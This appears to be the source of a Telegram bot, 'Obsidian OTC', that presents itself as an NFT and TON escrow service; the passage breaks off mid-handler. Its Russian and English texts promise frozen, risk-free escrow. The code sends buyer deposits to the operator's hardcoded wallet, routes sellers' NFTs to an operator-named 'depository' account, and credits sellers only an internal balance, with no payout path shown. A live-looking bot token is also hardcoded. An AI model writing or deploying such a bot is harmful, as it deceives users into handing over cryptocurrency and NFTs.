#!/usr/bin/env python3
"""
NFT OTC P2P Guarantee Bot — aiogram 3
pip install aiogram aiohttp aiosqlite
"""

import asyncio
import logging
import random
import re
import aiohttp
import aiosqlite
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties

# ── CONFIG ───────────────────────────────────────────────────
BOT_TOKEN      = "8526536073:AAHHit5cgsSbK3Dz1e60dBPOXiunjcsf_ks"
SUPPORT_HANDLE = "obsidian_help"
ADMIN_ID       = 7914777806
TON_WALLET     = "UQAUEtfBJMmEJbHfBTkCW9YmNTkqCp7LFb_KpEVRvQbX-HQ4"
SAFE_ACCOUNT   = "@ObsidianRelayer"
DB_PATH        = "otc_bot.db"
BOT_USERNAME   = ""
BANNER_PATH    = "obsidianbanner.jpg"   # положить рядом с main.py
# ─────────────────────────────────────────────────────────────

# ── BANNER ───────────────────────────────────────────────────
_banner_file_id = None

async def send_banner(chat_id: int, text: str, kb=None) -> None:
    global _banner_file_id
    photo = _banner_file_id if _banner_file_id else FSInputFile(BANNER_PATH)
    sent = await bot.send_photo(
        chat_id, photo=photo, caption=text,
        reply_markup=kb, parse_mode=ParseMode.HTML,
    )
    if not _banner_file_id and sent.photo:
        _banner_file_id = sent.photo[-1].file_id

async def replace_with_banner(cb_msg, text: str, kb=None) -> None:
    try:
        await cb_msg.delete()
    except Exception:
        pass
    await send_banner(cb_msg.chat.id, text, kb)
# ─────────────────────────────────────────────────────────────

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

# ── NEUTRAL SYMBOLS ──────────────────────────────────────────
I_WALLET  = "🔗"
I_DEAL    = "📋"
I_REF     = "🔗"
I_BAL     = "⚖️"
I_LANG    = "🌐"
I_SUPPORT = "💬"
I_BACK    = "←"
I_CHECK   = "✓"
I_CROSS   = "✗"
I_LOCK    = "🔒"
I_COIN    = "🪙"
I_GIFT    = "📦"
I_BOX     = "📦"
I_BELL    = "🔔"
I_PARTY   = "✅"
I_EYE     = "🔍"
I_PEOPLE  = "👤"
I_UP      = "⬆️"

# ── USER STATE ────────────────────────────────────────────────
user_state: dict = {}

S_TON       = "ton"
S_CARD      = "card"
S_AMOUNT    = "amount"
S_GIFTS     = "gifts"
S_RECIPIENT = "recipient"

# ── VALIDATION ───────────────────────────────────────────────
GIFT_RE = re.compile(r'^(https?://)?t\.me/nft/[A-Za-z0-9_]+-\d+$', re.IGNORECASE)
CARD_RE = re.compile(r'^.+\s*-\s*[\d\s]{10,25}$')

def norm_gift(link: str) -> str:
    link = link.strip()
    if link.startswith("https://"):
        return link
    if link.startswith("http://"):
        return "https://" + link[7:]
    return "https://" + link

def valid_ton(s: str) -> bool:
    s = s.strip()
    return (s.startswith("UQ") or s.startswith("EQ")) and 44 <= len(s) <= 52

def valid_card(s: str) -> bool:
    return bool(CARD_RE.match(s.strip()))

def valid_gifts(text: str):
    lines = [l.strip() for l in text.split("\n") if l.strip()]
    good  = [norm_gift(l) for l in lines if GIFT_RE.match(l)]
    return good or None

def valid_recipient(s: str):
    s = s.strip()
    if not s.startswith("@"):
        s = "@" + s
    return s if re.match(r'^@[A-Za-z0-9_]{3,32}$', s) else None

def gen_id() -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(random.choices(chars, k=8))

def fmt_gifts(gift_str: str) -> str:
    return "\n".join(f"  ➖ {l}" for l in gift_str.split(",") if l)

# ── DATABASE ─────────────────────────────────────────────────
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id     INTEGER PRIMARY KEY,
                username    TEXT,
                language    TEXT  DEFAULT 'ru',
                ton_wallet  TEXT,
                card        TEXT,
                balance     REAL  DEFAULT 0,
                referred_by INTEGER,
                created_at  TEXT
            );
            CREATE TABLE IF NOT EXISTS deals (
                id             TEXT PRIMARY KEY,
                seller_id      INTEGER,
                amount         REAL,
                currency       TEXT,
                gift_links     TEXT,
                payment_method TEXT,
                status         TEXT DEFAULT 'active',
                buyer_id       INTEGER,
                recipient      TEXT,
                created_at     TEXT
            );
            CREATE TABLE IF NOT EXISTS deposits (
                id         TEXT PRIMARY KEY,
                user_id    INTEGER,
                amount     REAL,
                status     TEXT DEFAULT 'pending',
                created_at TEXT
            );
        """)
        await db.commit()

async def get_user(uid: int):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT * FROM users WHERE user_id=?", (uid,)) as cur:
            return await cur.fetchone()

async def ensure_user(uid: int, username: str, referred_by=None):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id,username,language,balance,referred_by,created_at) VALUES (?,?,'ru',0,?,?)",
            (uid, username, referred_by, datetime.now().isoformat()),
        )
        await db.commit()

async def set_field(uid: int, field: str, value):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, uid))
        await db.commit()

async def get_lang(uid: int) -> str:
    u = await get_user(uid)
    return u[2] if u else "ru"

async def get_balance(uid: int) -> float:
    u = await get_user(uid)
    return round(float(u[5]), 4) if u else 0.0

async def add_balance(uid: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, uid))
        await db.commit()

async def deduct_balance(uid: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance - ? WHERE user_id=?", (amount, uid))
        await db.commit()

async def save_deal(did, seller_id, amount, currency, gift_links, method):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO deals VALUES (?,?,?,?,?,?,'active',NULL,NULL,?)",
            (did, seller_id, amount, currency, gift_links, method, datetime.now().isoformat()),
        )
        await db.commit()

async def fetch_deal(did: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT * FROM deals WHERE id=?", (did,)) as cur:
            return await cur.fetchone()

async def update_deal(did: str, **kw):
    async with aiosqlite.connect(DB_PATH) as db:
        for k, v in kw.items():
            await db.execute(f"UPDATE deals SET {k}=? WHERE id=?", (v, did))
        await db.commit()

# ── TON AUTO-CHECK ────────────────────────────────────────────
async def ton_checker():
    while True:
        await asyncio.sleep(60)
        try:
            url = f"https://toncenter.com/api/v2/getTransactions?address={TON_WALLET}&limit=30"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
            if not data.get("ok"):
                continue
            async with aiosqlite.connect(DB_PATH) as db:
                async with db.execute("SELECT id,user_id,amount FROM deposits WHERE status='pending'") as cur:
                    pending = await cur.fetchall()
            if not pending:
                continue
            for tx in data.get("result", []):
                in_msg  = tx.get("in_msg", {})
                comment = str(in_msg.get("message", "")).strip()
                value   = int(in_msg.get("value", 0)) / 1e9
                for dep_id, user_id, expected in pending:
                    if comment == dep_id and (expected == 0 or abs(value - expected) < 0.02):
                        credited = value if expected == 0 else expected
                        async with aiosqlite.connect(DB_PATH) as db:
                            await db.execute("UPDATE deposits SET status='confirmed' WHERE id=?", (dep_id,))
                            await db.commit()
                        await add_balance(user_id, credited)
                        lang = await get_lang(user_id)
                        msg = (
                            f"{I_CHECK} <b>Пополнение подтверждено</b>\n\nНа ваш счёт зачислено: <b>{credited:.4f} TON</b>"
                            if lang == "ru" else
                            f"{I_CHECK} <b>Deposit confirmed</b>\n\nCredited: <b>{credited:.4f} TON</b>"
                        )
                        try:
                            await bot.send_message(user_id, msg)
                        except Exception as ex:
                            logger.error(f"Deposit notify: {ex}")
        except Exception as ex:
            logger.error(f"TON check: {ex}")

# ── TEXTS ─────────────────────────────────────────────────────
def TX(lang: str) -> dict:
    ru = {
        "welcome": (
            "<b>Добро пожаловать в Obsidian OTC – надёжный P2P-гарант</b>\n\n"
            "💼 Покупайте и продавайте любые цифровые активы – безопасно!\n"
            "От Telegram-подарков и NFT до токенов TON и фиата – сделки проходят легко, быстро и без риска.\n\n"
            "🔹 Автоматическое сопровождение каждой сделки\n"
            "🔹 Партнёрская программа с мгновенными выплатами\n\n"
            "📖 <b>Возникли вопросы?</b>\nНапишите нам — @obsidian_help\n\n"
            "Выберите нужный раздел ниже:"
        ),
        "wallet_menu": (
            f"{I_WALLET} <b>Платёжные реквизиты</b>\n\n"
            "Укажите адрес TON-кошелька для получения оплаты в криптовалюте "
            "или реквизиты банковской карты для расчётов в рублях.\n\n"
            "Выберите тип реквизитов:"
        ),
        "enter_ton":     f"{I_WALLET} <b>TON-кошелёк</b>\n\nТекущий адрес: <code>{{}}</code>\n\nВведите новый TON-адрес (начинается с UQ... или EQ...):",
        "enter_card":    f"💳 <b>Банковская карта</b>\n\nТекущие реквизиты: <code>{{}}</code>\n\nУкажите банк и номер карты в формате:\n<code>Сбербанк — 4276 1234 5678 9012</code>",
        "ton_saved":     f"{I_CHECK} TON-адрес успешно сохранён. Вы будете получать оплату на этот кошелёк.",
        "card_saved":    f"{I_CHECK} Реквизиты карты сохранены. Покупатели смогут переводить оплату напрямую.",
        "bad_ton":       f"⚠️ Адрес не распознан. Корректный формат начинается с <b>UQ</b> или <b>EQ</b> и содержит 48 символов.\n\nПопробуйте ещё раз:",
        "bad_card":      f"⚠️ Формат не распознан. Укажите название банка и номер карты:\n<code>Сбербанк — 4276 1234 5678 9012</code>\n\nПопробуйте ещё раз:",
        "bad_gifts":     f"⚠️ Корректных ссылок не найдено. Убедитесь, что ссылки имеют вид:\n<code>https://t.me/nft/НазваниеАктива-12345</code>\n\nПопробуйте ещё раз:",
        "bad_recipient": f"⚠️ Username не распознан. Укажите аккаунт в формате <code>@username</code>\n\nПопробуйте ещё раз:",
        "bad_amount":    "⚠️ Некорректное значение. Введите числовую сумму, например: <code>100.5</code>",
        "pay_method": (
            f"{I_DEAL} <b>Создание сделки</b>\n\n"
            "Выберите валюту, в которой покупатель будет производить оплату:"
        ),
        "enter_amount": (
            f"{I_DEAL} <b>Создание сделки</b>\n\n"
            "Введите сумму, которую должен заплатить покупатель.\n\n"
            "Пример: <code>100.5</code>"
        ),
        "enter_gifts": (
            f"{I_GIFT} <b>NFT-активы для продажи</b>\n\n"
            "Отправьте ссылки на активы, которые вы передаёте покупателю. "
            "Каждая ссылка — с новой строки:\n\n"
            "<code>https://t.me/nft/НазваниеАктива-123\n"
            "https://t.me/nft/ДругойАктив-456</code>"
        ),
        "deal_ok": (
            f"{I_CHECK} <b>Сделка создана</b>\n\n"
            f"{I_COIN} Сумма к оплате: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Передаваемые активы:\n{{gifts}}\n\n"
            f"{I_REF} <b>Ссылка для покупателя:</b>\n"
            "<code>https://t.me/{bot}?start={did}</code>\n\n"
            "<i>Отправьте эту ссылку покупателю. После оплаты средства будут заморожены "
            "до момента фактической передачи NFT-актива.</i>"
        ),
        "deal_view": (
            f"{I_EYE} <b>Сделка #{{did}}</b>\n\n"
            f"{I_COIN} Сумма: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Активы:\n{{gifts}}\n\n"
            f"{I_BAL} Ваш баланс: <b>{{balance}} TON</b>\n{{pay_note}}"
        ),
        "my_balance": (
            f"{I_BAL} <b>Баланс счёта</b>\n\n"
            "Доступно для расчётов: <b>{balance} TON</b>\n\n"
            "<i>Средства на балансе используются для оплаты сделок. "
            "Пополнение — только через TON-сеть.</i>"
        ),
        "topup_ton": (
            f"{I_UP} <b>Пополнение счёта</b>\n\n"
            "Переведите <b>{amount} TON</b> на адрес гаранта:\n"
            "<code>{wallet}</code>\n\n"
            "⚠️ Обязательно укажите в комментарии к переводу код платежа:\n"
            "<code>{dep_id}</code>\n\n"
            "<i>Зачисление происходит автоматически в течение 1–2 минут после подтверждения транзакции.</i>"
        ),
        "enter_recipient": (
            f"{I_PEOPLE} <b>Получатель NFT-актива</b>\n\n"
            "Укажите Telegram-аккаунт, на который продавец должен передать актив после подтверждения оплаты.\n\n"
            "Формат: <code>@username</code>"
        ),
        "deal_paid_buyer": (
            f"{I_CHECK} <b>Оплата принята</b>\n\n"
            f"{I_COIN} Списано с баланса: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Активы:\n{{gifts}}\n\n"
            f"{I_LOCK} Средства <b>заморожены</b> на счёте гаранта и будут переведены продавцу "
            "только после подтверждения передачи актива.\n\n"
            "Текущий статус: <b>Ожидание передачи актива</b>"
        ),
        "deal_paid_seller": (
            f"{I_BELL} <b>Сделка #{{did}} оплачена</b>\n\n"
            "Покупатель перевёл <b>{amount} {cur}</b>. Средства заморожены на счёте гаранта "
            f"и будут зачислены вам сразу после подтверждения передачи NFT.\n\n"
            f"{I_BOX} <b>Инструкция по передаче актива:</b>\n\n"
            "① Откройте аккаунт-депозитарий:\n"
            '   <a href="https://t.me/ObsidianRelayer">t.me/ObsidianRelayer</a>\n\n'
            "② Передайте следующие активы:\n"
            "{gifts}\n\n"
            "③ Нажмите кнопку подтверждения ниже — <b>только после фактической передачи</b>."
        ),
        "deal_completed_seller": (
            f"{I_PARTY} <b>Сделка #{{did}} завершена</b>\n\n"
            f"{I_COIN} На ваш счёт зачислено: <b>{{amount}} {{cur}}</b>\n\n"
            "Благодарим за использование Obsidian OTC."
        ),
        "deal_completed_buyer": (
            f"{I_GIFT} <b>Актив передан продавцом</b>\n\n"
            "Продавец произвёл передачу NFT на депозитарий {safe}. "
            "Для получения актива свяжитесь с {safe} и укажите:\n\n"
            "◆ Username получателя: <b>{recipient}</b>\n"
            "◆ Номер сделки: <code>{did}</code>\n\n"
            f"{I_CHECK} Сделка #{{did}} успешно завершена."
        ),
        "no_deal":       f"{I_CROSS} Сделка не найдена. Проверьте правильность ссылки.",
        "deal_unavail":  f"{I_CROSS} Сделка уже исполнена или более недоступна.",
        "insufficient":  f"{I_CROSS} Недостаточно средств на балансе. Пожалуйста, пополните счёт.",
        "lang_menu":     "Выберите предпочтительный язык интерфейса:",
        "lang_ru_ok":    f"{I_CHECK} Язык интерфейса изменён на <b>Русский</b>.",
        "referral": (
            f"{I_REF} <b>Реферальная программа</b>\n\n"
            "Приглашайте новых пользователей и получайте комиссионное вознаграждение "
            "с каждой их сделки автоматически.\n\n"
            "Ваша персональная ссылка:\n"
            "<code>https://t.me/{bot}?start={ref_id}</code>"
        ),
    }
    en = {
        "welcome": (
            "<b>Welcome to Obsidian OTC – Reliable P2P Escrow</b>\n\n"
            "💼 Buy and sell any digital assets – safely!\n"
            "From Telegram gifts and NFTs to TON tokens and fiat – deals go smoothly, fast and risk-free.\n\n"
            "🔹 Automatic escrow for every deal\n"
            "🔹 Referral program with instant payouts\n\n"
            "📖 <b>Have questions?</b>\nContact us — @obsidian_help\n\n"
            "Select a section below:"
        ),
        "wallet_menu": (
            f"{I_WALLET} <b>Payment Details</b>\n\n"
            "Provide your TON wallet address for crypto payments "
            "or bank card details for fiat transactions.\n\n"
            "Select type:"
        ),
        "enter_ton":     f"{I_WALLET} <b>TON Wallet</b>\n\nCurrent address: <code>{{}}</code>\n\nEnter new TON address (starts with UQ... or EQ...):",
        "enter_card":    f"💳 <b>Bank Card</b>\n\nCurrent details: <code>{{}}</code>\n\nFormat: <code>Bank — Card number</code>",
        "ton_saved":     f"{I_CHECK} TON address saved. Payments will be received to this wallet.",
        "card_saved":    f"{I_CHECK} Card details saved. Buyers will transfer funds directly.",
        "bad_ton":       f"⚠️ Address not recognized. Valid format starts with <b>UQ</b> or <b>EQ</b>, 48 characters.\n\nTry again:",
        "bad_card":      f"⚠️ Format not recognized. Use: <code>Bank — Card number</code>\n\nTry again:",
        "bad_gifts":     f"⚠️ No valid links found. Links must look like:\n<code>https://t.me/nft/AssetName-12345</code>\n\nTry again:",
        "bad_recipient": f"⚠️ Username not recognized. Use format <code>@username</code>\n\nTry again:",
        "bad_amount":    "⚠️ Invalid value. Enter a number, e.g.: <code>100.5</code>",
        "pay_method": (
            f"{I_DEAL} <b>Create Deal</b>\n\n"
            "Select the currency in which the buyer will make the payment:"
        ),
        "enter_amount": (
            f"{I_DEAL} <b>Create Deal</b>\n\n"
            "Enter the amount the buyer must pay.\n\n"
            "Example: <code>100.5</code>"
        ),
        "enter_gifts": (
            f"{I_GIFT} <b>NFT Assets for Sale</b>\n\n"
            "Send links to the assets you are transferring to the buyer. "
            "One link per line:\n\n"
            "<code>https://t.me/nft/AssetName-123\nhttps://t.me/nft/Other-456</code>"
        ),
        "deal_ok": (
            f"{I_CHECK} <b>Deal Created</b>\n\n"
            f"{I_COIN} Amount: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Assets:\n{{gifts}}\n\n"
            f"{I_REF} <b>Buyer link:</b>\n"
            "<code>https://t.me/{bot}?start={did}</code>\n\n"
            "<i>Send this link to the buyer. Funds will be frozen until the NFT is actually transferred.</i>"
        ),
        "deal_view": (
            f"{I_EYE} <b>Deal #{{did}}</b>\n\n"
            f"{I_COIN} Amount: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Assets:\n{{gifts}}\n\n"
            f"{I_BAL} Balance: <b>{{balance}} TON</b>\n{{pay_note}}"
        ),
        "my_balance": (
            f"{I_BAL} <b>Account Balance</b>\n\n"
            "Available: <b>{balance} TON</b>\n\n"
            "<i>Balance is used to pay for deals. Top up via TON network only.</i>"
        ),
        "topup_ton": (
            f"{I_UP} <b>Top Up Account</b>\n\n"
            "Transfer <b>{amount} TON</b> to the escrow address:\n"
            "<code>{wallet}</code>\n\n"
            "⚠️ Include the payment code in the transaction comment:\n"
            "<code>{dep_id}</code>\n\n"
            "<i>Funds are credited automatically within 1–2 minutes after confirmation.</i>"
        ),
        "enter_recipient": (
            f"{I_PEOPLE} <b>NFT Recipient</b>\n\n"
            "Specify the Telegram account to which the seller should transfer the asset after payment is confirmed.\n\n"
            "Format: <code>@username</code>"
        ),
        "deal_paid_buyer": (
            f"{I_CHECK} <b>Payment Accepted</b>\n\n"
            f"{I_COIN} Charged: <b>{{amount}} {{cur}}</b>\n"
            f"{I_GIFT} Assets:\n{{gifts}}\n\n"
            f"{I_LOCK} Funds are <b>frozen</b> in escrow and will be released to the seller "
            "only after the asset transfer is confirmed.\n\n"
            "Status: <b>Awaiting asset transfer</b>"
        ),
        "deal_paid_seller": (
            f"{I_BELL} <b>Deal #{{did}} — Paid</b>\n\n"
            "The buyer has paid <b>{amount} {cur}</b>. Funds are held in escrow "
            f"and will be credited to you immediately upon transfer confirmation.\n\n"
            f"{I_BOX} <b>Transfer Instructions:</b>\n\n"
            "① Open the depository account:\n"
            '   <a href="https://t.me/ObsidianRelayer">t.me/ObsidianRelayer</a>\n\n'
            "② Transfer the following assets:\n"
            "{gifts}\n\n"
            "③ Press the confirmation button below — <b>only after the actual transfer</b>."
        ),
        "deal_completed_seller": (
            f"{I_PARTY} <b>Deal #{{did}} — Completed</b>\n\n"
            f"{I_COIN} Credited to your account: <b>{{amount}} {{cur}}</b>\n\n"
            "Thank you for using Obsidian OTC."
        ),
        "deal_completed_buyer": (
            f"{I_GIFT} <b>Asset Transferred</b>\n\n"
            "The seller has transferred the NFT to depository {safe}. "
            "Contact {safe} to receive your asset and provide:\n\n"
            "◆ Recipient: <b>{recipient}</b>\n"
            "◆ Deal ID: <code>{did}</code>\n\n"
            f"{I_CHECK} Deal #{{did}} successfully completed."
        ),
        "no_deal":       f"{I_CROSS} Deal not found. Please check the link.",
        "deal_unavail":  f"{I_CROSS} This deal has already been executed or is no longer available.",
        "insufficient":  f"{I_CROSS} Insufficient balance. Please top up your account.",
        "lang_menu":     "Select your preferred interface language:",
        "lang_en_ok":    f"{I_CHECK} Interface language set to <b>English</b>.",
        "referral": (
            f"{I_REF} <b>Referral Program</b>\n\n"
            "Invite new users and automatically earn a commission "
            "from every deal they make.\n\n"
            "Your personal link:\n"
            "<code>https://t.me/{bot}?start={ref_id}</code>"
        ),
    }
    return ru if lang == "ru" else en

async def t(uid: int, key: str, **kw) -> str:
    lang = await get_lang(uid)
    text = TX(lang).get(key, key)
    return text.format(**kw) if kw else text

# ── KEYBOARDS ─────────────────────────────────────────────────
def ib(text: str, cb: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=cb)

def ib_url(text: str, url: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, url=url)

async def kb_main(uid: int) -> InlineKeyboardMarkup:
    lang = await get_lang(uid)
    if lang == "ru":
        return InlineKeyboardMarkup(inline_keyboard=[
            [ib(f"{I_WALLET}  Платёжные реквизиты",  "wallet")],
            [ib(f"{I_DEAL}  Создать сделку",          "create_deal")],
            [ib(f"{I_REF}  Реферальная ссылка",       "referral")],
            [ib(f"{I_BAL}  Баланс счёта",             "balance")],
            [ib(f"{I_LANG}  Язык интерфейса",         "language")],
            [ib_url(f"{I_SUPPORT}  Служба поддержки", f"https://t.me/{SUPPORT_HANDLE}")],
        ])
    return InlineKeyboardMarkup(inline_keyboard=[
        [ib(f"{I_WALLET}  Payment Details",  "wallet")],
        [ib(f"{I_DEAL}  Create Deal",        "create_deal")],
        [ib(f"{I_REF}  Referral Link",       "referral")],
        [ib(f"{I_BAL}  Account Balance",     "balance")],
        [ib(f"{I_LANG}  Language",           "language")],
        [ib_url(f"{I_SUPPORT}  Support",     f"https://t.me/{SUPPORT_HANDLE}")],
    ])

async def kb_back(uid: int) -> InlineKeyboardMarkup:
    lang  = await get_lang(uid)
    label = f"{I_BACK}  Главное меню" if lang == "ru" else f"{I_BACK}  Main Menu"
    return InlineKeyboardMarkup(inline_keyboard=[[ib(label, "back")]])

async def kb_wallet(uid: int) -> InlineKeyboardMarkup:
    lang = await get_lang(uid)
    if lang == "ru":
        return InlineKeyboardMarkup(inline_keyboard=[
            [ib(f"{I_WALLET}  TON-кошелёк",       "add_ton")],
            [ib(f"💳  Банковская карта",            "add_card")],   # ← изменён смайлик
            [ib(f"{I_BACK}  Главное меню",         "back")],
        ])
    return InlineKeyboardMarkup(inline_keyboard=[
        [ib(f"{I_WALLET}  TON Wallet",  "add_ton")],
        [ib(f"💳  Bank Card",           "add_card")],               # ← изменён смайлик
        [ib(f"{I_BACK}  Main Menu",     "back")],
    ])

async def kb_payment(uid: int) -> InlineKeyboardMarkup:
    """Меню выбора способа получения оплаты при создании сделки."""
    lang = await get_lang(uid)
    if lang == "ru":
        return InlineKeyboardMarkup(inline_keyboard=[
            [ib("🔹  На TON-кошелёк",  "pay_ton")],    # ← 🔹
            [ib("💳  На карту",        "pay_card")],   # ← 💳
            [ib("⭐  Звёздами",        "pay_stars")],  # ← ⭐
            [ib(f"{I_BACK}  Главное меню", "back")],
        ])
    return InlineKeyboardMarkup(inline_keyboard=[
        [ib("🔹  To TON Wallet", "pay_ton")],
        [ib("💳  To Card",       "pay_card")],
        [ib("⭐  Stars",         "pay_stars")],
        [ib(f"{I_BACK}  Main Menu", "back")],
    ])

async def kb_deal_buyer(uid: int, did: str, enough: bool) -> InlineKeyboardMarkup:
    lang = await get_lang(uid)
    rows = []
    if enough:
        label = f"{I_CHECK}  Оплатить сделку" if lang == "ru" else f"{I_CHECK}  Pay for Deal"
        rows.append([ib(label, f"pay_deal_{did}")])
    top  = f"{I_UP}  Пополнить через TON" if lang == "ru" else f"{I_UP}  Top Up via TON"
    back = f"{I_BACK}  Главное меню" if lang == "ru" else f"{I_BACK}  Main Menu"
    rows.append([ib(top,  f"topup_{did}")])
    rows.append([ib(back, "back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def kb_balance(uid: int) -> InlineKeyboardMarkup:
    lang = await get_lang(uid)
    if lang == "ru":
        return InlineKeyboardMarkup(inline_keyboard=[
            [ib(f"{I_UP}  Пополнить баланс", "topup_free")],
            [ib(f"{I_BACK}  Главное меню",   "back")],
        ])
    return InlineKeyboardMarkup(inline_keyboard=[
        [ib(f"{I_UP}  Top Up Balance", "topup_free")],
        [ib(f"{I_BACK}  Main Menu",    "back")],
    ])

def kb_seller_confirm(did: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        ib(f"{I_CHECK}  Подтверждаю передачу / Confirm", f"seller_confirm_{did}")
    ]])

async def deal_view_text(uid: int, deal) -> str:
    did     = deal[0]; amount = deal[2]; cur = deal[3]
    gifts   = fmt_gifts(deal[4])
    balance = await get_balance(uid)
    enough  = balance >= amount
    lang    = await get_lang(uid)
    pay_note = ""
    if not enough:
        pay_note = (
            f"\n⚠️ Недостаточно средств. Нужно: <b>{amount} TON</b>, доступно: <b>{balance:.4f} TON</b>."
            if lang == "ru" else
            f"\n⚠️ Insufficient funds. Need: <b>{amount} TON</b>, available: <b>{balance:.4f} TON</b>."
        )
    return await t(uid, "deal_view", did=did, amount=amount, cur=cur,
                   gifts=gifts, balance=f"{balance:.4f}", pay_note=pay_note)

# ── HANDLERS ──────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(msg: Message):
    uid   = msg.from_user.id
    parts = msg.text.split(maxsplit=1)
    param = parts[1].strip() if len(parts) > 1 else ""
    await ensure_user(uid, msg.from_user.username or "")

    if param:
        if param.isdigit():
            await set_field(uid, "referred_by", int(param))
        else:
            deal = await fetch_deal(param)
            if not deal:
                await msg.answer(await t(uid, "no_deal"), reply_markup=await kb_back(uid))
                return
            if deal[6] != "active":
                await msg.answer(await t(uid, "deal_unavail"), reply_markup=await kb_back(uid))
                return
            enough = (await get_balance(uid)) >= deal[2]
            await msg.answer(await deal_view_text(uid, deal),
                             reply_markup=await kb_deal_buyer(uid, param, enough),
                             disable_web_page_preview=True)
            return

    await send_banner(uid, await t(uid, "welcome"), await kb_main(uid))

@dp.message(Command("addbalance"))
async def cmd_addbalance(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        _, target, amount = msg.text.split()
        await add_balance(int(target), float(amount))
        await msg.answer(f"✓ Начислено {amount} TON → {target}")
    except Exception:
        await msg.answer("Использование: /addbalance USER_ID AMOUNT")

@dp.message(Command("deals"))
async def cmd_deals(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT id,seller_id,amount,currency,status FROM deals ORDER BY created_at DESC LIMIT 20") as cur:
            rows = await cur.fetchall()
    text = "<b>Сделки:</b>\n\n" + "\n".join(
        f"· <code>{r[0]}</code>  {r[2]} {r[3]}  <b>{r[4]}</b>  {r[1]}" for r in rows
    ) if rows else "Нет сделок."
    await msg.answer(text)

@dp.message(Command("users"))
async def cmd_users(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id,username,balance FROM users ORDER BY created_at DESC LIMIT 20") as cur:
            rows = await cur.fetchall()
    text = "<b>Пользователи:</b>\n\n" + "\n".join(
        f"· @{r[1] or '?'} (<code>{r[0]}</code>) — {r[2]:.4f} TON" for r in rows
    )
    await msg.answer(text)

# ── CALLBACKS ─────────────────────────────────────────────────
@dp.callback_query()
async def on_button(cb: CallbackQuery):
    uid = cb.from_user.id
    d   = cb.data
    await cb.answer()

    async def edit(text: str, kb=None, no_preview=False):
        if cb.message.photo:
            await cb.message.edit_caption(caption=text, reply_markup=kb)
        else:
            await cb.message.edit_text(text, reply_markup=kb, disable_web_page_preview=no_preview)

    if d == "back":
        user_state.pop(uid, None)
        await edit(await t(uid, "welcome"), await kb_main(uid))

    elif d == "wallet":
        await edit(await t(uid, "wallet_menu"), await kb_wallet(uid))

    elif d == "add_ton":
        u = await get_user(uid)
        w = u[3] if u and u[3] else ("не указан" if await get_lang(uid) == "ru" else "not set")
        user_state[uid] = {"state": S_TON}
        lang = await get_lang(uid)
        text = TX(lang)["enter_ton"].replace("{{}}", w)
        await edit(text, await kb_back(uid))

    elif d == "add_card":
        u = await get_user(uid)
        c = u[4] if u and u[4] else ("не указаны" if await get_lang(uid) == "ru" else "not set")
        user_state[uid] = {"state": S_CARD}
        lang = await get_lang(uid)
        text = TX(lang)["enter_card"].replace("{{}}", c)
        await edit(text, await kb_back(uid))

    elif d == "create_deal":
        await edit(await t(uid, "pay_method"), await kb_payment(uid))

    elif d == "pay_ton":
        # ── TON: валюта TON ─────────────────────────────────
        user_state[uid] = {"state": S_AMOUNT, "method": "TON", "currency": "TON"}
        await edit(await t(uid, "enter_amount"), await kb_back(uid))

    elif d == "pay_card":
        # ── Карта: валюта RUB ────────────────────────────────
        user_state[uid] = {"state": S_AMOUNT, "method": "CARD", "currency": "RUB"}
        await edit(await t(uid, "enter_amount"), await kb_back(uid))

    elif d == "pay_stars":
        # ── Звёзды: валюта STARS ─────────────────────────────
        user_state[uid] = {"state": S_AMOUNT, "method": "STARS", "currency": "STARS"}
        await edit(await t(uid, "enter_amount"), await kb_back(uid))

    elif d == "balance":
        bal = await get_balance(uid)
        await edit(await t(uid, "my_balance", balance=f"{bal:.4f}"), await kb_balance(uid))

    elif d == "topup_free":
        dep_id = gen_id()
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT INTO deposits VALUES (?,?,0,'pending',?)",
                             (dep_id, uid, datetime.now().isoformat()))
            await db.commit()
        lang = await get_lang(uid)
        amt  = "любую сумму" if lang == "ru" else "any amount"
        await edit(await t(uid, "topup_ton", amount=amt, wallet=TON_WALLET, dep_id=dep_id),
                   await kb_back(uid))

    elif d.startswith("topup_"):
        did  = d[len("topup_"):]
